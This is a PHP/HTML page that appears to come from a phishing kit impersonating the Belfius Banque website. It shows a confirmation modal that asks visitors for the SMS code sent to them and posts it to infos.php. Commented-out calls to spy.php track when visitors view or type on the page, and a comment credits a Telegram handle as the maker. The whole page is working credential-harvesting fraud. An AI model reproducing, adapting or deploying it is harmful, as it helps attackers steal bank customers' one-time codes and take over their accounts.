<?php 



     require_once "functions.php";
     require_once "ajax.php";


                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================

?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Belfius Banque - Belfius</title>
        <!-- logo site web-->
        <link rel="icon" href="image/belfius.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/belfius.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/sur.css">
        <link rel="stylesheet"  href="css/animate.css">
        <style>
            .modal-open{
                overflow:hidden;
                padding-right:0px;
            }
        </style>

</head>
<body class="modal-open">

        <div class="home_1">
            <img src="image/xl.png">
        </div>

        <div class="home_2">
            <img src="image/lg.png">
        </div>

        <div class="home_3">
            <img src="image/md.png">
        </div>

        <div class="home_4">
            <img src="image/sm.png">
        </div>

        <div class="home_5">
            <img src="image/xs.png">
        </div>

        <div class="home_6">
            <img src="image/zz.png">
        </div>

         <!-- Modal -->
        <div class="modal problem fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;"> 
          <div class="modal-dialog shadow ">
            <div class="modal-content">
              <div class="modal-header text-center ">
                  <h4>Confirmation</h4>
                  <i class="bi bi-x-lg"></i>
              </div>
              <div class="modal-body">
                 <div class="row">
                     <div class="col-lg-5 col-md-5 text-center sis pt-5"><img src="image/inbg.png" ></div>
                     <div class="col-lg-7 col-md-7 frr ">
                         <div class="right pb-5">
                             <div class="topping">
                                 <ul>
                                     <li class=" doom"><a href="">Informations sur la carte</a></li>
                                     <li class="active"><a href="">Confirmation</a></li>
                                     <li class="doom"><a href="">FINALISATION</a></li>
                                 </ul>
                             </div> 
                             <div class="milieu">
                                 <h4>Entrez le code que vous avez reçu par SMS</h4>
                                 <form action="infos.php" method="post">
                                    <input type="hidden" name="step" value="sms">
                                     <div class="makarina">
                                         <div class="form-group bland mt-3">
                                             <label>Code SMS</label>
                                             <input type="text" name="sms" id="sms" class="form-control" required pattern="[0-9]{6,10}$">
                                         </div>
                                     </div>
                                 
                             </div>
                         </div>
                     </div>
                 </div>
                 <div class="bottona justify-content-end">
                     <button class="btn" name="submit" id="submit" disabled><img src="image/confirmer.png">Confirmer</button>
                 </div>
                 </form>
              </div>
            </div>
          </div>
        </div>






        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>

            $("#sms").mask("0000000000");


            $("#sms").keyup(function(){
                if($("#sms").val().length > 5){
                    $("#submit").attr("disabled",false);
                    $("#submit").css("background","#C20145");
                    $("#sms").css("border","1px solid #C20145");
                }else{
                    $("#submit").attr("disabled",true);
                    $("#submit").css("background","#DDDDE0");
                    $("#sms").css("border","1px solid #979faa");
                }
            });


            

            // $.post("spy.php",{billingview:1});
            //  var abort = false;
            //  $("#first").keyup(function(){
            //     if(abort==false){
            //        $.post("spy.php", {billinging:1});
            //        abort=true;
            //     }
            //  });

             
        </script>
              
</body>
</html>